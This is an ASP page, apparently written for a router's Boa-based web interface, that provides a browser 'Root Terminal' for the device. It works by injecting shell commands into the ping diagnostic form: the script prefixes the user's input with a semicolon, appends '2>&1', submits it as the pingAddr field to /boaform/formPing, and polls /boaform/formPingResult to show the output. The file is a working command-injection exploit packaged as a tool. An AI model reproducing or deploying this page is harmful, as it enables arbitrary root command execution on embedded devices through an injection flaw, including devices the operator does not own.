<%SendWebHeadStr(); %>
<title>Root Terminal</title>
<STYLE type=text/css>
@import url(/style/default.css);
</STYLE>
<style>
#terminal-wrap {
    display: flex;
    flex-direction: column;
    height: 600px;
    gap: 8px;
    padding: 10px;
}

    #history {
        flex: 1;
        background: #0a0a0d;
        border: 1px solid var(--border-color);
        border-radius: 6px;
        padding: 10px 14px;
        overflow-y: auto;
        font-size: 14px;
        line-height: 1.6;
        word-break: break-all;
        scrollbar-width: thin;
        scrollbar-color: #333 transparent;
        min-height: 300px;
    }

    .entry { margin-bottom: 10px; }
    .entry .cmd-line { color: #fff; margin-bottom: 3px; }
    .entry .cmd-line .ps1 { color: #a0a0a0; }
    .entry .cmd-line .continuation { color: #555; }
    .entry .result {
        white-space: pre-wrap;
        color: #cccccc;
        padding-left: 14px;
        border-left: 2px solid #222230;
    }
    .entry .result.pending {
        color: #555566;
        font-style: italic;
    }

    #input-bar {
        display: flex;
        align-items: flex-start;
        gap: 8px;
        background: var(--bg-surface);
        border: 1px solid var(--border-color);
        border-radius: 6px;
        padding: 8px 14px;
        flex-shrink: 0;
        transition: border-color 0.2s;
    }
    #input-bar:focus-within {
        border-color: var(--accent-color);
    }

    #prompt-label {
        color: var(--text-secondary);
        white-space: nowrap;
        font-size: 13px;
        user-select: none;
        padding-top: 4px;
    }

    #cli-form {
        flex: 1;
        display: flex;
        margin: 0;
    }

    #cmd-input {
        background: transparent !important;
        border: none !important;
        outline: none !important;
        color: var(--text-primary) !important;
        font-size: 14px !important;
        flex: 1;
        caret-color: var(--accent-color);
        padding: 0 !important;
        width: 100%;
        resize: none;
        overflow: hidden;
        line-height: 1.5;
        min-height: 24px;
    }

    #statusbar {
        color: var(--text-secondary);
        font-size: 11px;
        padding: 2px 4px;
        min-height: 16px;
        flex-shrink: 0;
    }
    #statusbar.running { color: var(--accent-color); }

    #hint {
        color: var(--text-secondary);
        font-size: 11px;
        text-align: right;
        flex-shrink: 0;
        padding-right: 2px;
    }

    #shell-form { display: none; }
</style>

<script>
    var cmdHistory   = [];
    var historyIndex = -1;
    var pollToken    = 0;

    function escapeHtml(str) {
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
    }

    function setStatus(msg, cls) {
        var s = document.getElementById('statusbar');
        s.textContent = msg;
        s.className = cls || '';
    }

    function sendStop() {
        var form = document.getElementById('shell-form');
        document.getElementById('payload').value       = '';
        document.getElementById('shellPingAct').value  = 'Stop';
        if (typeof postTableEncrypt === 'function') {
            postTableEncrypt(form.postSecurityFlag, form);
        }
        form.submit();
        document.getElementById('shellPingAct').value  = 'Start';
    }

    function pollResult(entryEl, attempts, lastText, stableCount) {
        var myToken = pollToken;

        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/boaform/formPingResult', true);
        xhr.onload = function() {
            if (myToken !== pollToken) return;

            if (xhr.status !== 200) {
                setTimeout(function() { pollResult(entryEl, attempts + 1, lastText, stableCount); }, 250);
                return;
            }

            var raw  = xhr.responseText || '';
            var text = raw.replace(/<[^>]*>/g, '').trim();

            if (attempts > 60) {
                finalizeResult(entryEl, text || '(no output)');
                sendStop();
                setStatus('ready', '');
                return;
            }

            if (!text) {
                if (attempts >= 6) {
                    finalizeResult(entryEl, '(no output)');
                    sendStop();
                    setStatus('ready', '');
                    return;
                }
                setTimeout(function() { pollResult(entryEl, attempts + 1, '', 0); }, 500);
                return;
            }

            if (text === lastText) {
                stableCount++;
                if (stableCount >= 3) {
                    finalizeResult(entryEl, text);
                    sendStop();
                    setStatus('ready', '');
                    return;
                }
            } else {
                stableCount = 0;
            }

            setTimeout(function() { pollResult(entryEl, attempts + 1, text, stableCount); }, 500);
        };
        xhr.onerror = function() {
            if (myToken !== pollToken) return;
            setTimeout(function() { pollResult(entryEl, attempts + 1, lastText, stableCount); }, 500);
        };
        xhr.send();
    }

    function finalizeResult(entryEl, text) {
        var resultEl = entryEl.querySelector('.result');
        resultEl.className = 'result';
        resultEl.textContent = text;
        var history = document.getElementById('history');
        history.scrollTop = history.scrollHeight;
        setTimeout(function() { document.getElementById('cmd-input').focus(); }, 0);
    }

    function autoResize(el) {
        el.style.height = 'auto';
        el.style.height = el.scrollHeight + 'px';
    }

    function runCommand() {
        var input = document.getElementById('cmd-input');
        var cmd   = input.value.trim();
        if (!cmd) return;

        pollToken++;
        cmdHistory.unshift(cmd);
        if (cmdHistory.length > 100) cmdHistory.pop();
        historyIndex = -1;

        input.value = '';
        input.style.height = 'auto';
        input.focus();

        if (cmd === 'clear' || cmd === 'cls') {
            document.getElementById('history').innerHTML = '';
            return;
        }

        var lines   = cmd.split('\n').map(function(l) { return l.trim(); }).filter(Boolean);
        var payload = '; ' + lines.join(' ; ') + ' 2>&1';

        var history = document.getElementById('history');
        var entry   = document.createElement('div');
        entry.className = 'entry';

        var cmdLine = document.createElement('div');
        cmdLine.className = 'cmd-line';
        var cmdHtml = '<span class="ps1">Admin@M2-2050# </span>' + escapeHtml(lines[0]);
        for (var i = 1; i < lines.length; i++) {
            cmdHtml += '<br><span class="ps1 continuation">&gt; </span>' + escapeHtml(lines[i]);
        }
        cmdLine.innerHTML = cmdHtml;

        var resultEl = document.createElement('div');
        resultEl.className = 'result pending';
        resultEl.textContent = 'running\u2026';

        entry.appendChild(cmdLine);
        entry.appendChild(resultEl);
        history.appendChild(entry);
        history.scrollTop = history.scrollHeight;

        setStatus('running: ' + lines[0], 'running');

        var form = document.getElementById('shell-form');
        document.getElementById('payload').value       = payload;
        document.getElementById('shellPingAct').value  = 'Start';
        if (typeof postTableEncrypt === 'function') {
            postTableEncrypt(form.postSecurityFlag, form);
        }
        form.submit();

        setTimeout(function() { pollResult(entry, 0, '', 0); }, 300);
    }

    window.onload = function() {
        var input = document.getElementById('cmd-input');
        input.focus();

        document.getElementById('input-bar').addEventListener('click', function() {
            input.focus();
        });

        input.addEventListener('input', function() { autoResize(this); });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                runCommand();
            } else if (e.key === 'ArrowUp' || e.keyCode === 38) {
                var before = this.value.substring(0, this.selectionStart).split('\n');
                if (before.length === 1) {
                    e.preventDefault();
                    if (historyIndex < cmdHistory.length - 1) {
                        historyIndex++;
                        input.value = cmdHistory[historyIndex];
                        autoResize(input);
                    }
                }
            } else if (e.key === 'ArrowDown' || e.keyCode === 40) {
                var all     = this.value.split('\n');
                var before2 = this.value.substring(0, this.selectionStart).split('\n');
                if (before2.length === all.length) {
                    e.preventDefault();
                    if (historyIndex > 0) {
                        historyIndex--;
                        input.value = cmdHistory[historyIndex];
                    } else {
                        historyIndex = -1;
                        input.value = '';
                    }
                    autoResize(input);
                }
            }
        });
    };
</script>
</head>
<body>

<div class="intro_main">
    <p class="intro_title">Web Terminal</p>
    <p class="intro_content">Execute shell commands directly on the device. Enter to run, Shift+Enter for newline.</p>
</div>

<div id="terminal-wrap">
    <div id="statusbar">ready</div>
    <div id="history"></div>
    <div id="hint">Enter to run &nbsp;|&nbsp; Shift+Enter for newline</div>
    <div id="input-bar">
        <span id="prompt-label">Admin@M2-2050:~#</span>
        <form id="cli-form" onsubmit="event.preventDefault(); runCommand();" action="javascript:void(0);">
            <textarea id="cmd-input"
                      autofocus
                      autocomplete="off"
                      autocorrect="off"
                      autocapitalize="off"
                      spellcheck="false"
                      rows="1"
                      enterkeyhint="go"></textarea>
        </form>
        <input class="inner_btn" type="button" value="clear"
               onclick="document.getElementById('history').innerHTML=''; document.getElementById('cmd-input').focus();">
    </div>
</div>

<iframe name="blind_frame" style="display:none;"></iframe>

<form id="shell-form"
      action="/boaform/formPing"
      method="POST"
      target="blind_frame">
    <input type="hidden" name="pingAddr" id="payload">
    <input type="hidden" name="wanif"    value="any">
    <input type="hidden" name="pingAct"  id="shellPingAct" value="Start">
    <input type="hidden" name="submit-url" value="/terminal.asp">
    <input type="hidden" name="postSecurityFlag" value="">
</form>

</body>
</html>

